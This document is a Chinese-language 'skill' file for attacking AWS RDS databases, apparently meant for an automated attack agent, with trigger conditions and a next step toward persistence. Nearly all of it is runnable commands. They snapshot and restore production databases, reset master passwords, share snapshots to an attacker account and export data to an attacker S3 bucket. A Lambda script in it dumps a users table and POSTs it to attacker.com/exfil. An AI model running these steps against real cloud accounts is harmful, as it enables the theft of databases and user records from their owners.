---
name: aws-rds-attack
type: attack
category: database-exploitation
platform: aws
severity: high
---

# AWS RDS 攻击技能

## 触发条件

- 有 AWS 凭证且有 RDS 权限
- 发现 rds:* 权限
- 用户要求"攻击数据库"

## 前置检查

```bash
# 1. 列出 RDS 实例
aws rds describe-db-instances --query 'DBInstances[].{ID:DBInstanceIdentifier,Engine:Engine,Status:DBInstanceStatus}'

# 2. 检查快照
aws rds describe-db-snapshots --query 'DBSnapshots[].{Snapshot:DBSnapshotIdentifier,DB:DBInstanceIdentifier}'
```

## 攻击方法

### 方法 1: 快照恢复

```bash
# 1. 创建快照
aws rds create-db-snapshot \
  --db-instance-identifier production-db \
  --db-snapshot-identifier stolen-snapshot

# 2. 等待快照完成
aws rds describe-db-snapshots --db-snapshot-identifier stolen-snapshot

# 3. 从快照创建新实例
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier stolen-db \
  --db-snapshot-identifier stolen-snapshot

# 4. 修改主密码（如果需要）
aws rds modify-db-instance \
  --db-instance-identifier stolen-db \
  --master-user-password NewPassword123! \
  --apply-immediately

# 5. 获取连接信息
ENDPOINT=$(aws rds describe-db-instances \
  --db-instance-identifier stolen-db \
  --query 'DBInstances[0].Endpoint.Address' --output text)

# 6. 连接数据库
mysql -h $ENDPOINT -u admin -p
```

### 方法 2: 共享快照

```bash
# 1. 共享快照到攻击者账户
aws rds modify-db-snapshot-attribute \
  --db-snapshot-identifier stolen-snapshot \
  --attribute-name restore \
  --values-to-add 123456789012

# 2. 在攻击者账户中恢复
aws rds restore-db-instance-from-db-snapshot \
  --db-instance-identifier restored-db \
  --db-snapshot-identifier arn:aws:rds:us-east-1:123456789012:snapshot:stolen-snapshot \
  --source-region us-east-1
```

### 方法 3: 导出数据

```bash
# 1. 创建 S3 存储桶
aws s3 mb s3://stolen-database

# 2. 开始导出
aws rds start-export-task \
  --export-task-identifier database-export \
  --source-arn arn:aws:rds:us-east-1:123456789012:db:production-db \
  --s3-bucket-name stolen-database \
  --iam-role-arn arn:aws:iam::123456789012:role/rds-export-role \
  --kms-key-id arn:aws:kms:us-east-1:123456789012:key/xxxxx

# 3. 监控任务
aws rds describe-export-tasks --export-task-identifier database-export

# 4. 下载数据
aws s3 sync s3://stolen-database ./downloaded-db
```

### 方法 4: 通过 Lambda 读取

```bash
# 1. 创建 Lambda 函数连接数据库
cat > rds_dump.py <<'EOF'
import pymysql
import boto3

def lambda_handler(event, context):
    # 连接 RDS
    conn = pymysql.connect(
        host='rds-endpoint.xxx.rds.amazonaws.com',
        user='admin',
        password='password',
        database='mysql'
    )

    # 导出数据
    cursor = conn.cursor()
    cursor.execute("SHOW TABLES")
    tables = cursor.fetchall()

    # 获取敏感数据
    cursor.execute("SELECT * FROM users")
    users = cursor.fetchall()

    # 发送到外部
    import requests
    requests.post('https://attacker.com/exfil', json={'users': users})

    return {'statusCode': 200}
EOF

zip rds_dump.zip rds_dump.py

# 2. 创建函数
aws lambda create-function \
  --function-name rds-dump \
  --runtime python3.9 \
  --role arn:aws:iam::123456789012:role/LambdaRole \
  --handler rds_dump.lambda_handler \
  --zip-file fileb://rds_dump.zip \
  --vpc-config SubnetIds=subnet-xxx,SecurityGroupIds=sg-xxx

# 3. 执行
aws lambda invoke --function-name rds-dump output.txt
```

### 方法 5: 证书窃取

```bash
# 1. 通过 RDS 事件订阅
aws rds describe-event-subscriptions

# 2. 创建新的订阅到 SNS
aws rds create-event-subscription \
  --subscription-name rds-events \
  --sns-topic arn:aws:sns:us-east-1:123456789012:rds-events \
  --source-type db-instance \
  --source-ids production-db \
  --event-categories failover,failure

# 3. 监控 SNS 获取凭证
# 事件中可能包含连接信息
```

## 验证成功

```bash
# 成功创建快照
aws rds describe-db-snapshots --db-snapshot-identifier stolen-snapshot

# 成功恢复实例
aws rds describe-db-instances --db-instance-identifier stolen-db

# 成功导出数据
aws s3 ls s3://stolen-database

# 成功连接数据库
mysql -h $ENDPOINT -u admin -p
```

## 下一步

1. 分析数据库内容
2. 提取敏感信息
3. aws-persistence - 建立持久化
